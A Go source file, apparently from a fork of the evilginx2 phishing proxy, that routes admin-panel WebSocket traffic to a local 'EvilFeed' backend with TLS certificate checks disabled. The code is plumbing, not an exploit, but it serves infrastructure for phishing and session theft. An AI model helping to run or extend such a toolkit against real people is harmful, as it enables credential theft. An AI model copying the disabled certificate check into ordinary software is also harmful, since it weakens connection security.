package core

import (
	"crypto/tls"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"

	"github.com/kgretzky/evilginx2/log"
)

// ServeHTTP implements the http.Handler interface to intercept WebSocket requests
// that goproxy cannot handle natively as a reverse proxy
func (p *HttpProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// Check if this is a WebSocket upgrade request for the Admin Panel
	if p.cfg.IsAdminPanelEnabled() && strings.EqualFold(r.Header.Get("Upgrade"), "websocket") {
		baseDomain := p.cfg.GetBaseDomain()
		adminPath := p.cfg.GetAdminPath()

		// Only intercept if we are on the base domain and matching admin path
		if baseDomain != "" && strings.EqualFold(r.Host, baseDomain) && strings.HasPrefix(r.URL.Path, adminPath) {
			p.serveAdminWebSocket(w, r)
			return
		}
	}

	// Fallback to standard goproxy handler
	p.Proxy.ServeHTTP(w, r)
}

func (p *HttpProxy) serveAdminWebSocket(w http.ResponseWriter, r *http.Request) {
	// Get EvilFeed backend URL
	evilFeedEndpoint := p.cfg.GetAdminPanelConfig().AdminBackend
	if evilFeedEndpoint == "" {
		evilFeedEndpoint = "http://127.0.0.1:1337"
	}

	// Calculate target path
	adminPath := p.cfg.GetAdminPath()
	basePath := strings.TrimSuffix(adminPath, "/")
	targetPath := strings.TrimPrefix(r.URL.Path, basePath)
	if targetPath == "" {
		targetPath = "/"
	}

	// Parse backend URL
	targetURL, err := url.Parse(evilFeedEndpoint)
	if err != nil {
		log.Error("[WebSocket] Failed to parse backend URL: %v", err)
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
		return
	}

	// Create reverse proxy
	proxy := httputil.NewSingleHostReverseProxy(targetURL)

	// Customize the director to rewriting the path
	originalDirector := proxy.Director
	proxy.Director = func(req *http.Request) {
		originalDirector(req)
		req.URL.Path = targetPath
		// Ensure Host header is set correctly for backend
		req.Host = targetURL.Host

		// Force HTTP/1.1 for WebSockets (just in case)
		req.Proto = "HTTP/1.1"
		req.ProtoMajor = 1
		req.ProtoMinor = 1
	}

	// Configure transport for local backend (skip verify)
	proxy.Transport = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	log.Debug("[WebSocket] Proxying connection to %s%s", evilFeedEndpoint, targetPath)
	proxy.ServeHTTP(w, r)
}
